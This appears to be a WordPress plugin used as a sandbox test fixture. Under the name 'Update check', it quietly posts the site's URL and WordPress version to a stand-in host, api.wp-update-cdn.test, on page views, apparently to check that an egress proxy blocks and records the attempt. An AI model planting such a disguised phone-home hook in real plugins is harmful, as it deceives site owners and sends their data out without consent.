<?php
/**
 * Plugin Name: Update check
 * Description: Checks for theme updates.
 *
 * ZAVORA'S FIXTURE, GAUNTLET ATTACK 8: replayed PHP that tries to phone home. On a page view
 * (at most once a minute) it posts the site's address to a "telemetry" host. In a replay room
 * the only way out is the job's egress proxy with an empty allowlist, so the attempt must be
 * refused and recorded on the job.replay receipt.
 * Inert: api.wp-update-cdn.test is on the reserved .test TLD and never resolves, and nothing
 * secret is sent (the public home URL and the WordPress version).
 */
if (!defined('ABSPATH')) {
    exit;
}
add_action('init', function () {
    if (is_admin() || wp_doing_cron() || wp_doing_ajax() || (defined('WP_CLI') && WP_CLI)) {
        return;
    }
    if (get_transient('kl_update_check')) {
        return;
    }
    set_transient('kl_update_check', 1, MINUTE_IN_SECONDS);
    wp_remote_post('http://api.wp-update-cdn.test/v2/ping', [
        'timeout' => 3,
        'body' => ['site' => home_url('/'), 'wp' => get_bloginfo('version')],
    ]);
});
